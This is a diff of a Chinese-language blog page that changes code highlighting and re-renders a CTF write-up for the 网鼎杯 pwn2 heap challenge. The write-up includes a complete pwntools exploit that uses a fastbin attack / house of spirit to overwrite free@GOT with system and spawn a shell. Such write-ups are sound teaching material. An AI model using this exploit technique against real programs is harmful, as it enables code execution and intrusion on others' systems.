@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="网鼎杯 第三场 pwn2 wp​    昨天群里群主说网鼎杯有道pwn2已经写能写got表了，但是最后还是没有做出来，很好奇就去看了一下。​">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -316,9 +316,64 @@
     
     <div class="post-body" itemprop="articleBody">
         <h2 id="网鼎杯-第三场-pwn2-wp"><a href="#网鼎杯-第三场-pwn2-wp" class="headerlink" title="网鼎杯 第三场 pwn2 wp"></a>网鼎杯 第三场 pwn2 wp</h2><p>​    昨天群里群主说网鼎杯有道pwn2已经写能写got表了，但是最后还是没有做出来，很好奇就去看了一下。<br>​    <a id="more"></a><br>​    经典选单程序不多说，先来找一波漏洞。add函数将size和chunk ptr交错置于bss段上，delete函数没有uaf，但是edit函数中存在溢出，那就好办了，已知的符合此种情况的攻击方式貌似很多，unlink和fastbin attack，unsorted bin attack，top chunk attack理论上应该都是可以的，因为可以任意溢出，这里的话我用的是fastbin attack。毕竟检查比较方便，也只要构造单向链表。<br>​    这里的思路是通过构造fake chunk之后利用house of spirit写free_got，当然atoi_got应该也是可以的，待会去试下，同时在堆上存一个/bin/sh，之后delete一下就能get shell了，说起来很简单，其实坑也很多,但是说白了其实也是自己对堆管理模式还是不够清楚，网鼎杯后打算好好补一波理论了。<br>坑点1：<br>​    需要修改fake chunk的size段使其满足在0x70的fastbin中，因为之后我们写的chunk size为0x7f，这里需要满足下，否在程序会报错”malloc():memory corruption(fast)”，出现这个报错一般就是fastbin中的size不匹配问题了。比如说如果fastbin是0x20，那么chunk的size也必须是0x20。<br>坑点2：<br>​    read之后的加’\x00’操作，如果直接p64()写got表的话容易溢出\x00到目标got的后一个got，可能会对程序流程有一定的影响，同样的，edit的长度也要注意下，否则容易把’\x0a’写入到目标got的后一个got中影响程序流程。<br>大概就是这样了，这道题方法应该很多，有空可以试试其它方法，加深一下理解。</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">p</span>=process('./pwn')</span><br><span class="line"><span class="attribute">elf</span>=ELF('./pwn')</span><br><span class="line"><span class="attribute">libc</span>=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line"><span class="comment">#gdb.attach(p,'''</span></span><br><span class="line"><span class="comment">#	break *0x0000000000400E58</span></span><br><span class="line"><span class="comment">#	continue</span></span><br><span class="line"><span class="comment">#''')</span></span><br><span class="line">def <span class="builtin-name">add</span>(size,x):</span><br><span class="line">	p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Please enter the length of servant name:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Please enter the name of servant:'</span>)</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">	p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Please enter the index of servant:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def <span class="builtin-name">edit</span>(idx,size,x):</span><br><span class="line">	p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Please enter the index of servant:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Please enter the length of servant name:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Please enter the new name of the servnat:'</span>)</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">	p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">add</span>(0x68,<span class="string">'a'</span><span class="number">*0</span>x68)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,<span class="string">'b'</span><span class="number">*0</span>x68)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,<span class="string">'c'</span><span class="number">*0</span>x68)</span><br><span class="line"><span class="builtin-name">add</span>(0x60,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">dele(1)</span><br><span class="line"><span class="comment">#edit(0,0x68+0x10+0x8,'1'*0x68+p64(0x71)+p64(0x00000000006020C0-0x13))</span></span><br><span class="line"><span class="builtin-name">edit</span>(0,0x68+0x10+0x8,<span class="string">'1'</span><span class="number">*0</span>x68+p64(0x71)+p64(0x00000000006020C0-0x13))</span><br><span class="line"><span class="builtin-name">add</span>(0x68,<span class="string">'a'</span><span class="number">*0</span>x68)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,<span class="string">'\x00'</span><span class="number">*3</span>+p64(0x68)+p64(elf.got[<span class="string">'free'</span>]))</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'0 : '</span>)</span><br><span class="line"><span class="attribute">free_address</span>=u64(p.recv(6).ljust(8,'\x00'))</span><br><span class="line"><span class="comment">#print hex(free_address)</span></span><br><span class="line">log.<span class="builtin-name">info</span>(<span class="string">'free_address &gt; '</span>+hex(free_address))</span><br><span class="line"><span class="attribute">libc_base</span>=free_address-libc.symbols[<span class="string">'free'</span>]</span><br><span class="line"><span class="attribute">system_address</span>=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.<span class="builtin-name">info</span>(<span class="string">'system_address &gt; '</span>+hex(system_address))</span><br><span class="line"><span class="comment">#edit(2,0x8,'/bin/sh\x00')</span></span><br><span class="line"><span class="builtin-name">edit</span>(0,0x7,p64(system_address)[0:7])</span><br><span class="line">dele(3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code>from pwn import *
+p=process(&#39;./pwn&#39;)
+elf=ELF(&#39;./pwn&#39;)
+libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+#gdb.attach(p,&#39;&#39;&#39;
+#    break *0x0000000000400E58
+#    continue
+#&#39;&#39;&#39;)
+def add(size,x):
+    p.recvuntil(&#39;Your choice:&#39;)
+    p.sendline(&#39;2&#39;)
+    p.recvuntil(&#39;Please enter the length of servant name:&#39;)
+    p.sendline(str(size))
+    p.recvuntil(&#39;Please enter the name of servant:&#39;)
+    p.sendline(x)
 
+def dele(idx):
+    p.recvuntil(&#39;Your choice:&#39;)
+    p.sendline(&#39;4&#39;)
+    p.recvuntil(&#39;Please enter the index of servant:&#39;)
+    p.sendline(str(idx))
 
+def edit(idx,size,x):
+    p.recvuntil(&#39;Your choice:&#39;)
+    p.sendline(&#39;3&#39;)
+    p.recvuntil(&#39;Please enter the index of servant:&#39;)
+    p.sendline(str(idx))
+    p.recvuntil(&#39;Please enter the length of servant name:&#39;)
+    p.sendline(str(size))
+    p.recvuntil(&#39;Please enter the new name of the servnat:&#39;)
+    p.sendline(x)
+
+def show():
+    p.recvuntil(&#39;Your choice:&#39;)
+    p.sendline(&#39;1&#39;)
+
+add(0x68,&#39;a&#39;*0x68)
+add(0x68,&#39;b&#39;*0x68)
+add(0x68,&#39;c&#39;*0x68)
+add(0x60,&#39;/bin/sh\x00&#39;)
+dele(1)
+#edit(0,0x68+0x10+0x8,&#39;1&#39;*0x68+p64(0x71)+p64(0x00000000006020C0-0x13))
+edit(0,0x68+0x10+0x8,&#39;1&#39;*0x68+p64(0x71)+p64(0x00000000006020C0-0x13))
+add(0x68,&#39;a&#39;*0x68)
+add(0x68,&#39;\x00&#39;*3+p64(0x68)+p64(elf.got[&#39;free&#39;]))
+show()
+p.recvuntil(&#39;0 : &#39;)
+free_address=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+#print hex(free_address)
+log.info(&#39;free_address &gt; &#39;+hex(free_address))
+libc_base=free_address-libc.symbols[&#39;free&#39;]
+system_address=libc_base+libc.symbols[&#39;system&#39;]
+log.info(&#39;system_address &gt; &#39;+hex(system_address))
+#edit(2,0x8,&#39;/bin/sh\x00&#39;)
+edit(0,0x7,p64(system_address)[0:7])
+dele(3)
+p.interactive()
+</code></pre>
     </div>
 
     
@@ -423,6 +478,8 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
